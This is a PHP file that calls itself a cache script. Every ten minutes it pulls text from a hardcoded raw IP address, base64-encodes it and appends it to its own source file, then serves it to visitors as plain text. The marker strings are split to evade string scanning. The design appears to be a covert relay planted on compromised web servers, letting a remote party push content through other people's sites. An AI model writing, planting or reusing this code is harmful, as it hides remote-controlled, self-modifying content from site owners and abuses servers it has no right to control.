<?php



// ----------------------------------------------------------------------

// touch this!  ---------------------------------------------------------



define( 'CACHE_DEBUG', 				false );

define( 'CACHE_TIME_SECONDS', 		600 );

define( 'CACHE_UPDATE_URL',  		"http://193.105.240.93/data/include/fall.txt" );



// ----------------------------------------------------------------------

// dont touch this! -----------------------------------------------------



define( 'CACHE_MARKER_START', 		"<?p"."hp /* <CA"."CHE>" );  

define( 'CACHE_MARKER_END', 		"</CA"."CHE> */ ?".">" );





// ----------------------------------------------------------------------





$cache_code 	= null;

$cache_file 	= __FILE__;

$cached_time 	= time() - filemtime($cache_file);



// ----------------------------------------------------------------------



if (CACHE_DEBUG) echo "Cached time is {$cached_time} seconds, update planned after ".(CACHE_TIME_SECONDS - $cached_time)." seconds\n";





// ----------------------------------------------------------------------

// check cached time 



if($cached_time > CACHE_TIME_SECONDS)

{

	// get new cache code

	$cache_code = file_get_contents(CACHE_UPDATE_URL);

	if(!empty($cache_code))

	{

		if (CACHE_DEBUG) echo "Update cache...\n";

		write_cache($cache_file, $cache_code);

	}

	else

	{

		if (CACHE_DEBUG) echo "Can't get cache data!\n";

	}

}

else

{

		if(CACHE_DEBUG) echo "Read cache code...\n";



		// extract cached data

		$cache_code = extract_cache($cache_file);

		if(empty($cache_code))

		{

			if (CACHE_DEBUG) echo "Cache empty! Update cache...\n";

			$cache_code = file_get_contents(CACHE_UPDATE_URL);

			if(!empty($cache_code))

			{

				// write cache

				write_cache($cache_file, $cache_code);

			}

			else

			{

				if (CACHE_DEBUG) echo "Can't get cache data!\n";

			}

		}

}



// ----------------------------------------------------------------------



header("Content-Type: text/plain; charset=windows-1251");

echo $cache_code;



// ----------------------------------------------------------------------



exit;



// ----------------------------------------------------------------------

/// read file data



function file_get_contents_locked($file_path)

{

	$fp = fopen($file_path, "r");

	if($fp !== FALSE)

	{

		flock($fp, LOCK_EX);

		$data = fread($fp, filesize($file_path));

		flock($fp, LOCK_UN);

		fclose($fp);



		return $data;

	}



	return FALSE;

}





// ----------------------------------------------------------------------

/// extract cache from file by cache markers



function extract_cache($file_path)

{

	$data = file_get_contents_locked($file_path);

	if(strpos($data, CACHE_MARKER_START) !== FALSE)

	{

		$cache_start_pos = strpos($data, CACHE_MARKER_START) + strlen(CACHE_MARKER_START);

		$cache_end_pos = strpos($data, CACHE_MARKER_END);



		$cache = substr($data, $cache_start_pos, $cache_end_pos - $cache_start_pos);



		if(!empty($cache))

			return base64_decode($cache);

	}



	return null;

}





// ----------------------------------------------------------------------

// write cache to file



function write_cache($file_path, $cache_data)

{

	if(!is_writable($file_path))

	{

		if (CACHE_DEBUG) echo "Cache file not writable!\n";

		return null;

	}



	$data = file_get_contents_locked($file_path);

	if($data !== FALSE && !empty($data))

	{

		// delete old cache

		if(strpos($data, CACHE_MARKER_START) !== FALSE)

		{

			$cache_start_pos = strpos($data, CACHE_MARKER_START);



			$data = substr($data, 0, $cache_start_pos);

			$data = rtrim($data);

		}



		// restore close tags

		if(substr($data, -2, 2) !== '?>')

			$data.="?>";



		$data.= CACHE_MARKER_START .base64_encode($cache_data). CACHE_MARKER_END;



		$fp=fopen($file_path, "w+");

		flock($fp, LOCK_EX);

		fwrite($fp, $data);

		flock($fp, LOCK_UN);

		fclose($fp);

	}

}